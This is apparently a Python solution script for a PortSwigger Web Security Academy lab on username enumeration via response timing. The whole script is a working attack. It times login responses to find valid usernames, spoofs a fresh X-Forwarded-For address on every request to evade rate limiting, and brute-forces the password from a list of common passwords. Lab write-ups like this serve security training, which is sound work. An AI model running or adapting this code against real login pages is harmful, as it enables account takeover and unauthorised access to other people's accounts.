#!/usr/bin/env python3
"""
Username enumeration via response timing
PortSwigger Web Security Academy -- Authentication

Companion script for the writeup: 03-username-enumeration-via-response-timing.md

What this does:
    Sends a 500-character password against every candidate username, spoofing a
    unique X-Forwarded-For per request so the app's own rate limiting never slows
    (or blocks) the probing. Valid usernames trigger a real bcrypt comparison and
    take measurably longer than invalid ones, which short-circuit immediately. Runs
    three full passes over the username list and averages per-username timing to
    filter network jitter, flagging whichever username's average time exceeds 1.5x
    the overall average (or, failing that threshold, whichever scored highest).
    Then brute-forces the password for the identified username, again spoofing a
    unique source IP per attempt.

Usage:
    python 03-username-enumeration-via-response-timing.py <lab-url>

Requirements:
    pip install httpx
"""

import sys
import time
from collections import defaultdict

import httpx

USERNAMES = [
    "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user",
    "administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user",
    "vagrant", "azureuser", "academico", "acceso", "access", "accounting",
    "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin",
    "administracion", "administrador", "administrator", "administrators",
    "admins", "ads", "adserver", "adsl", "ae", "af", "affiliate", "affiliates",
    "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai",
    "al", "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind",
    "am", "amarillo", "americas", "an", "anaheim", "analyzer", "announce",
    "announcements", "antivirus", "ao", "ap", "apache", "apollo", "app",
    "app01", "app1", "apple", "application", "applications", "apps",
    "appserver", "aq", "ar", "archie", "arcsight", "argentina", "arizona",
    "arkansas", "arlington", "as", "as400", "asia", "asterix", "at", "athena",
    "atlanta", "atlas", "att", "au", "auction", "austin", "auth", "auto",
    "autodiscover",
]

PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
    "monitoring", "montana", "moon", "moscow",
]

import re


def _csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def _spoofed_ip(prefix: str, counter: int) -> str:
    return f"{prefix}.{counter // 65025}.{(counter // 255) % 255}.{counter % 255 + 1}"


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    long_pw = "A" * 500
    scores = defaultdict(list)
    ip_counter = 1

    for pass_num in range(3):
        print(f"[*] Timing pass {pass_num + 1}/3...")
        timings = {}
        for uname in USERNAMES:
            ip_counter += 1
            page = client.get(f"{lab_url}/login")
            csrf = _csrf(page.text)
            start = time.time()
            client.post(f"{lab_url}/login", data={
                "csrf": csrf, "username": uname, "password": long_pw
            }, headers={"X-Forwarded-For": _spoofed_ip("10", ip_counter)})
            elapsed = time.time() - start
            timings[uname] = elapsed
            scores[uname].append(elapsed)

        avg = sum(timings.values()) / len(timings)
        top3 = sorted(timings.items(), key=lambda x: x[1], reverse=True)[:3]
        print(f"[*] Pass {pass_num + 1}: avg={avg:.3f}s, top3: {[(n, f'{t:.3f}s') for n, t in top3]}")

    avg_scores = {u: sum(ts) / len(ts) for u, ts in scores.items()}
    overall_avg = sum(avg_scores.values()) / len(avg_scores)
    top = sorted(avg_scores.items(), key=lambda x: x[1], reverse=True)[0]
    print(f"[*] Overall avg: {overall_avg:.3f}s, top: {top[0]}={top[1]:.3f}s (ratio={top[1] / overall_avg:.2f}x)")

    if top[1] > overall_avg * 1.5:
        found_user = top[0]
        print(f"[+] Username found (timing): {found_user}")
    else:
        found_user = top[0]
        print(f"[!] Low confidence (ratio below 1.5x), trying top scorer anyway: {found_user}")

    print(f"[*] Brute-forcing password for: {found_user}")
    found_pw = None
    for pw in PASSWORDS:
        ip_counter += 1
        page = client.get(f"{lab_url}/login")
        resp = client.post(f"{lab_url}/login", data={
            "csrf": _csrf(page.text), "username": found_user, "password": pw
        }, headers={"X-Forwarded-For": _spoofed_ip("172", ip_counter)})
        if resp.status_code == 302 or "my-account" in getattr(resp.url, "path", ""):
            found_pw = pw
            break
        txt = resp.text.lower()
        if "incorrect" not in txt and "invalid" not in txt and "too many" not in txt:
            check = client.get(f"{lab_url}/my-account")
            if check.status_code == 200 and "log in" not in check.text.lower():
                found_pw = pw
                break

    if found_pw:
        print(f"[+] Password found: {found_pw}")
    else:
        print("[-] No password matched from the candidate list.")

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
